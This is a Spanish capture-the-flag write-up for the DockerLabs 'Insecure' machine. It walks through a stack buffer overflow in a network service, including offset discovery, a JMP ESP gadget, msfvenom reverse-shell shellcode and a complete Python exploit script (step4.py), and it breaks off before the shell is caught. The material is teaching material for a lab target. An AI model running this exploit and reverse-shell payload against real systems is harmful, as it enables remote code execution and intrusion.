---
icon: flag
---

# Insecure DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip insecure.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh insecure.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:18 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000037s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: software installation
|_http-server-header: Apache/2.4.62 (Debian)
20201/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Enter data: Data received correctly
|   NULL: 
|_    Enter data:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port20201-TCP:V=7.94SVN%I=7%D=12/18%Time=6762936E%P=x86_64-pc-linux-gnu
SF:%r(NULL,C,"Enter\x20data:\x20")%r(GenericLines,24,"Enter\x20data:\x20Da
SF:ta\x20received\x20correctly\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```

Si nos metemos en la pagina que viene con el puerto `80`, veremos que podremos descargar un `"software"` que tiene la pagina, si nos lo descargamos veremos que el archivo se llama `secure_software`.

Si vemos que tipo de archivo es, ya que no viene con una extension:

```
file secure_software
```

Info:

```
secure_software: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1badf7bdd2ab6ae00b8c3b1f965fca6048d32478, for GNU/Linux 3.2.0, not stripped
```

Vemos que es un `.elf` un ejecutable para linux, si lo ejecutamos parece ser que esta a la escucha generando un `socket` a la espera de alguna peticion, pero no hace mucho mas.

Podremos probar a revisar las seguridades de la aplicacion por si fuera vulnerable a un `Buffer Overflow` y poder sobreescribir la aplicacion en alguna direccion de memoria en la que se pueda escribir haciendo `ingenieria inversa`:

```shell
checksec --file=secure_software
```

Info:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50 Symbols        No    0               1               secure_software
```

Vemos que las protecciones mas criticas estan desactivadas, por lo que podremos sobrescribir algun codigo de memoria que este dentro de la aplicacion, por lo que utilizaremos `GDB` pero utilizando un entorno llamado `PEDA` dentro del `GDB`, la cual nos proporciona herramientas para facilitar este tipo de `explotacion`.

## Ingenieria inversa (secure\_software)

### Instalacion de GDB con PEDA/GDB con pwndbg

Lo que primero tendremos que hacer sera lo siguiente:

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Y si iniciamos el programa con `GDB` pasandole como parametro el programa, se nos pondra el `gdb-peda`...

```shell
gdb ./secure_software
```

Pero si diera error por las versiones, podremos instalar esta otra herramienta que es mas poderosa:

```shell
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Y si iniciamos `gdb` veremos lo siguiente:

```shell
gdb ./secure_software
```

Info:

```
GNU gdb (Debian 15.2-1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 176 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./secure_software...
(No debugging symbols found in ./secure_software)
------- tip of the day (disable with set show-tips off) -------
Use GDB's pi command to run an interactive Python console where you can use Pwndbg APIs like pwndbg.aglib.memory.read(addr, len), pwndbg.aglib.memory.write(addr, data), pwndbg.aglib.vmmap.get() and so on!                                                                                                              
pwndbg>
```

### Comprobacion de desbordamiento de Buffer

En el `host`, generamos una cadena de caracteres diseñada para intentar desbordar el `buffer` de la aplicación. Esto se logra con la herramienta `pattern_create.rb`:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Info:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Este patrón se usará como entrada en la aplicación para identificar cómo se maneja el `buffer`.

Conectamos al servicio vulnerable usando `netcat`:

> Host:

```shell
netcat 127.0.0.1 20201
```

Info:

```
Enter data:
```

Introducimos los `400` caracteres generados previamente. Para automatizar este paso, creamos un script en `Python`:

> step1.py

Este script automatiza la conexión y el envío del patrón:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

test_pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + test_pattern + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Antes de ejecutar el script, inicia la aplicación en `GDB` (preferentemente con `pwndbg`):

> gdb (pwndbg)

```shell
run
```

Ahora en el `host` ejecutamos:

```shell
python3 step1.py
```

**Resultado esperado en GDB:** La aplicación debería mostrar un error de segmentación (`SIGSEGV`), indicando que el buffer fue desbordado. Observa el valor de `EIP` en los registros, que reflejará parte del patrón enviado.

Y en el `GDB` veremos algo asi:

```
Starting program: /home/kali/Desktop/insecure/secure_software 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Listening at 0.0.0.0:20201!
Listening at 0.0.0.0:20201!

Program received signal SIGSEGV, Segmentation fault.
0x41306b41 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffffff
 EBX  0x41366a41 ('Aj6A')
 ECX  0
 EDX  0xffffffb8
 EDI  0x6a41376a ('j7Aj')
 ESI  0xffffd320 —▸ 0xffffd4ff ◂— 'COLORTERM=truecolor'
 EBP  0x396a4138 ('8Aj9')
 ESP  0xffffd240 ◂— 'k1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
 EIP  0x41306b41 ('Ak0A')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x41306b41










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd240 ◂— 'k1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
01:0004│     0xffffd244 ◂— '2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
02:0008│     0xffffd248 ◂— 'Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
03:000c│     0xffffd24c ◂— 'k5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
04:0010│     0xffffd250 ◂— '6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
05:0014│     0xffffd254 ◂— 'Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
06:0018│     0xffffd258 ◂— 'k9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
07:001c│     0xffffd25c ◂— '0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x41306b41 None
   1 0x6b41316b None
   2 0x336b4132 None
   3 0x41346b41 None
   4 0x6b41356b None
   5 0x376b4136 None
   6 0x41386b41 None
   7 0x6c41396b None
────────────────────────────────────────────────────────────────────────
```

Veremos que hemos conseguido pasarnos del `buffer` y nos muestra la direccion de memoria que nos importa llamado `EIP` que seria `0x41306b41`.

### Identificación del Offset

Para determinar el desplazamiento exacto (`offset`) donde ocurre la `sobrescritura`, usamos `pattern_offset.rb`, proporcionando la dirección en hexadecimal obtenida en `EIP`:

> Host

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41366a41
```

Info:

```
[*] Exact match at offset 288
```

Esto indica que el `offset` es de `288` bytes, por lo que haremos lo siguiente, para automatizar todo este proceso:

> step2.py

Creamos un nuevo script que utiliza el `offset` para sobrescribir el registro `EIP` con un valor controlado (`BBBB`):

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
eip_override = b"B" * 4

crafted_payload = padding + eip_override

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Antes, tendremos que hacer lo siguiente en `GDB` para iniciar la aplicacion:

> gdb (pwndbg)

```shell
run
```

Y ahora en el `host` ejecutaremos el script:

> host

```shell
python3 step2.py
```

**Resultado esperado en GDB:** El registro `EIP` ahora debería estar sobrescrito con `0x42424242` (`BBBB`).

Por lo que veremos lo siguiente en el `GDB`:

```
Starting program: /home/kali/Desktop/insecure/secure_software 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Listening at 0.0.0.0:20201!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffffff
 EBX  0x41414141 ('AAAA')
 ECX  0
 EDX  0xffffffb8
 EDI  0x41414141 ('AAAA')
 ESI  0xffffd320 —▸ 0xffffd4ff ◂— 'COLORTERM=truecolor'
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd240 —▸ 0xffff0a0d ◂— 0
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd240 —▸ 0xffff0a0d ◂— 0
01:0004│     0xffffd244 —▸ 0xf7f9be14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x235d0c /* '\x0c]#' */
02:0008│     0xffffd248 ◂— 0
03:000c│     0xffffd24c —▸ 0xf7d8ad43 (__libc_start_call_main+115) ◂— add esp, 0x10
04:0010│     0xffffd250 ◂— 0
05:0014│     0xffffd254 ◂— 0
06:0018│     0xffffd258 —▸ 0xf7da4069 (__new_exitfn+9) ◂— add ebx, 0x1f7dab
07:001c│     0xffffd25c —▸ 0xf7d8ad43 (__libc_start_call_main+115) ◂— add esp, 0x10
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x42424242 None
   1 0xffff0a0d None
──────────────────────────────────────────────────────────────────────────────
```

Vemos que funciona y sobrescribe con `B` el `EIP` por lo que ahora tendremos que injectar un `shellcode` para que se nos haga una `reverse shell` al servidor aprovechando esta vulnerabilidad.

### Verificación del Espacio Después del EIP

Queremos comprobar qué ocurre con los datos introducidos después del `EIP`. Para ello, añadimos datos adicionales (`CCCC`) al final del payload creando una variable `after_eip` y automatizaremos todo esto con un script:

> step3.py

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
eip_override = b"B" * 4
post_eip_data = b"C" * 300

crafted_payload = padding + eip_override + post_eip_data

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Ahora en el `GDB` tendremos que poner de nuevo `run` para ejecutar la aplicacion:

> gdb (pwndbg)

```shell
run
```

Y en el host ejecutamos el script:

> host

```shell
python3 step3.py
```

En el `GDB` tendremos que ver algo asi:

```
Starting program: /home/kali/Desktop/insecure/secure_software 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Listening at 0.0.0.0:20201!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 EAX  0xffffffff
 EBX  0x41414141 ('AAAA')
 ECX  0
 EDX  0xffffffb8
 EDI  0x41414141 ('AAAA')
 ESI  0xffffd320 ◂— 0x43434343 ('CCCC')
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd240 ◂— 0x43434343 ('CCCC')
 EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd240 ◂— 0x43434343 ('CCCC')
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0 0x42424242 None
   1 0x43434343 None
   2 0x43434343 None
   3 0x43434343 None
   4 0x43434343 None
   5 0x43434343 None
   6 0x43434343 None
   7 0x43434343 None
───────────────────────────────────────────────────────────────────────────────────
```

**Resultado esperado:** En GDB, verifica la pila (`stack`) para comprobar que los `CCCC` aparecen después del `EIP`. Usa este comando (`x/300wx $esp`)

Si ejecutamos `x/300wx $esp` para ver la información que hay en el pila vemos que nuestras `Cs` se están introduciendo al principio de la pila (`stack`), por lo que en este punto lo que debemos hacer es encontrar un `OpCode` el cual nos permita realizar un salto al `ESP`, es decir al principio de la pila.

```shell
x/300wx $esp
```

Info:

```
0xffffd240:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd250:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd260:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd270:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd280:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd290:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2a0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2b0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2c0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2d0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2e0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2f0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd300:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd310:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd320:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd330:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd340:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd350:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd360:     0x43434343      0x43434343      0x43434343      0xffff0a0d
0xffffd370:     0xffffddf0      0xffffde0e      0xffffde2c      0xffffde34
0xffffd380:     0xffffde54      0xffffde77      0xffffde8f      0xffffdea7
0xffffd390:     0xffffdebc      0xffffded5      0xffffdeea      0xffffdf02
0xffffd3a0:     0xffffdf17      0xffffdf3c      0xffffdf43      0xffffdf4e
0xffffd3b0:     0xffffdf7b      0xffffdf89      0xffffdfb7      0xffffdfc0
0xffffd3c0:     0x00000000      0x00000020      0xf7fc6570      0x00000021
0xffffd3d0:     0xf7fc6000      0x00000033      0x000006f0      0x00000010
0xffffd3e0:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xffffd3f0:     0x00000064      0x00000003      0x08048034      0x00000004
0xffffd400:     0x00000020      0x00000005      0x0000000b      0x00000007
0xffffd410:     0xf7fc8000      0x00000008      0x00000000      0x00000009
0xffffd420:     0x080490f0      0x0000000b      0x00000000      0x0000000c
0xffffd430:     0x00000000      0x0000000d      0x00000000      0x0000000e
0xffffd440:     0x00000000      0x00000017      0x00000000      0x00000019
0xffffd450:     0xffffd48b      0x0000001a      0x00000000      0x0000001f
0xffffd460:     0xffffdfcc      0x0000000f      0xffffd49b      0x0000001b
0xffffd470:     0x0000001c      0x0000001c      0x00000020      0x00000000
0xffffd480:     0x00000000      0x00000000      0x0e000000      0x1f82b0e6
0xffffd490:     0xe31f1a07      0x5dd9cf5f      0x6923ed1f      0x00363836
0xffffd4a0:     0x00000000      0x00000000      0x6f682f00      0x6b2f656d
0xffffd4b0:     0x2f696c61      0x6b736544      0x2f706f74      0x65736e69
0xffffd4c0:     0x65727563      0x6365732f      0x5f657275      0x74666f73
0xffffd4d0:     0x65726177      0x41414100      0x41414141      0x41414141
0xffffd4e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4f0:     0x41414141      0x41414141      0x41414141      0x43004141
0xffffd500:     0x524f4c4f      0x4d524554      0x7572743d      0x6c6f6365
0xffffd510:     0x4400726f      0x4c505349      0x3a3d5941      0x00302e30
0xffffd520:     0x474e414c      0x5f6e653d      0x552e5355      0x382d4654
0xffffd530:     0x4e414c00      0x47415547      0x50003d45      0x3d485441
0xffffd540:     0x6f6f722f      0x696d2f74      0x6f63696e      0x3361646e
0xffffd550:     0x6e6f632f      0x69626164      0x752f3a6e      0x6c2f7273
0xffffd560:     0x6c61636f      0x6962732f      0x752f3a6e      0x6c2f7273
0xffffd570:     0x6c61636f      0x6e69622f      0x73752f3a      0x62732f72
0xffffd580:     0x2f3a6e69      0x2f727375      0x3a6e6962      0x6962732f
0xffffd590:     0x622f3a6e      0x2f3a6e69      0x2f727375      0x61636f6c
0xffffd5a0:     0x61672f6c      0x3a73656d      0x7273752f      0x6d61672f
0xffffd5b0:     0x54007365      0x3d4d5245      0x72657478      0x35322d6d
0xffffd5c0:     0x6c6f6336      0x5800726f      0x48545541      0x5449524f
0xffffd5d0:     0x682f3d59      0x2f656d6f      0x696c616b      0x61582e2f
0xffffd5e0:     0x6f687475      0x79746972      0x47445800      0x5255435f
0xffffd5f0:     0x544e4552      0x5345445f      0x504f544b      0x4346583d
0xffffd600:     0x534c0045      0x4c4f435f      0x3d53524f      0x303d7372
0xffffd610:     0x3d69643a      0x333b3130      0x6e6c3a34      0x3b31303d
0xffffd620:     0x6d3a3633      0x30303d68      0x3d69703a      0x333b3034
0xffffd630:     0x6f733a33      0x3b31303d      0x643a3533      0x31303d6f
0xffffd640:     0x3a35333b      0x343d6462      0x33333b30      0x3a31303b
0xffffd650:     0x343d6463      0x33333b30      0x3a31303b      0x343d726f
0xffffd660:     0x31333b30      0x3a31303b      0x303d696d      0x75733a30
0xffffd670:     0x3b37333d      0x733a3134      0x30333d67      0x3a33343b
0xffffd680:     0x303d6163      0x77743a30      0x3b30333d      0x6f3a3234
0xffffd690:     0x34333d77      0x3a32343b      0x333d7473      0x34343b37
0xffffd6a0:     0x3d78653a      0x333b3130      0x2e2a3a32      0x3d726174
0xffffd6b0:     0x333b3130      0x2e2a3a31      0x3d7a6774      0x333b3130
0xffffd6c0:     0x2e2a3a31      0x3d637261      0x333b3130      0x2e2a3a31
0xffffd6d0:     0x3d6a7261      0x333b3130      0x2e2a3a31      0x3d7a6174
0xffffd6e0:     0x333b3130      0x2e2a3a31      0x3d61686c      0x333b3130
```

Y solo nos interesara estos de aqui:

```
0xffffd240:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd250:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd260:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd270:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd280:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd290:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2a0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2b0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2c0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2d0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2e0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd2f0:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd300:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd310:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd320:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd330:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd340:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd350:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd360:     0x43434343      0x43434343      0x43434343      0xffff0a0d
```

Vemos que se esta realizando todo correctamente al principio de la pila y llenando esos huecos con la `C` que se corresponden con `0x43434343`.

### Identificación del OpCode para JMP ESP

Para redirigir la ejecución al principio de la pila (`ESP`), necesitamos identificar el código de operación (`opcode`) de un salto (`JMP ESP`). Usamos `nasm_shell.rb`:

```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Nos metera en una shell interactiva de la herramienta:

```
nasm >
```

Y ejecutamos lo siguiente:

```
jmp esp
```

Info:

```
00000000  FFE4              jmp esp
```

Esto indica que el opcode para `JMP ESP` es `FFE4`.

Ahora usaremos `objdump` para saber cual es la dirección de memoria la cual nos permite realizar el `JMP ESP`

```shell
objdump -d secure_software | grep "FF E4" -i
```

Info:

```
8049213:       ff e4                   jmp    *%esp
```

Y veremos que la direccion de memoria es `0x08049213`.

### Generar un Shellcode (Reverse Shell)

Ahora generaremos un `shellcode` con `msfvenom` de la siguiente forma:

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x0a\x0d' -f py
```

El flag `-b '\x00\x0a\x0d'` excluye los caracteres nulos y de salto de línea, ya que podrían interrumpir la ejecución del payload. El flag `-f py` genera el código en formato Python para facilitar su inclusión en scripts.

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xda\xd0\xba\xd0\xd0\x81\xae\xd9\x74\x24\xf4\x5f"
buf += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x57\x13\x03\x87"
buf += b"\xc3\x63\x5b\x16\x3f\x94\x47\x0b\xfc\x08\xe2\xa9"
buf += b"\x8b\x4e\x42\xcb\x46\x10\x30\x4a\xe9\x2e\xfa\xec"
buf += b"\x40\x28\xfd\x84\x92\x62\xf8\xee\x7b\x71\x03\x10"
buf += b"\x1d\xfc\xe2\x9c\xbb\xae\xb5\x8f\xf0\x4c\xbf\xce"
buf += b"\x3a\xd2\xed\x78\xab\xfc\x62\x10\x5b\x2c\xaa\x82"
buf += b"\xf2\xbb\x57\x10\x56\x35\x76\x24\x53\x88\xf9"
```

### Obtener una shell como el usuario securedev

Por lo que crearemos un script para automatizar todo esto y tambien añadiremos en el script una cadena de `NOPS` para que salte todo hasta nuestro `shellcode` y se ejecute nuestra `rever shell`.

> step4.py

```python
#!/usr/bin/python3

import socket
from struct import pack

target_ip = "172.17.0.2"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
jmp_esp_address = pack("<L", 0x08049213)  # Dirección de JMP ESP obtenida con análisis previo.
nop_sled = b'\x90' * 32  # Pista de NOPs para mayor tolerancia.

# Shellcode personalizado para reverse shell
reverse_shellcode =  b""
reverse_shellcode += b"\xba\x77\xff\xe1\x69\xd9\xec\xd9\x74\x24\xf4\x58"
reverse_shellcode += b"\x33\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\x27"
reverse_shellcode += b"\xf1\x03\x9c\xf6\xd6\x33\xbc\xab\xab\xe8\x29\x49"
reverse_shellcode += b"\xa5\xee\x1e\x2b\x78\x70\xcd\xea\x32\x4e\x3f\x8c"
reverse_shellcode += b"\x7a\xc8\x46\xe4\xbc\x82\xbc\x4e\x54\xd1\xbe\xb0"
reverse_shellcode += b"\xee\x5c\x5f\x7c\x96\x0e\xf1\x2f\xe4\xac\x78\x2e"
reverse_shellcode += b"\xc7\x33\x28\xd8\xb6\x1c\xbe\x70\x2f\x4c\x6f\xe2"
reverse_shellcode += b"\xc6\x1b\x8c\xb0\x4b\x95\xb2\x84\x67\x68\xb4"

crafted_payload = padding + jmp_esp_address + nop_sled + reverse_shellcode

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

**Desbordamiento del buffer**: El payload comienza con `A`'s para llenar el buffer hasta alcanzar el `offset` donde se sobrescribe el `EIP` (`288` en este caso).

**Dirección de retorno**: Utilizamos la dirección de una instrucción `jmp esp` para redirigir la ejecución hacia nuestro `shellcode`. Esta dirección se obtiene mediante análisis del binario vulnerable usando herramientas como `gdb`.

**NOP sled**: Se añade una "`pista`" de `NOPs` (`\x90`) antes del `shellcode` para garantizar que cualquier variación en la dirección de salto no interfiera con la ejecución del `payload`.

Por lo que ahora tendremos que hacer lo siguiente:

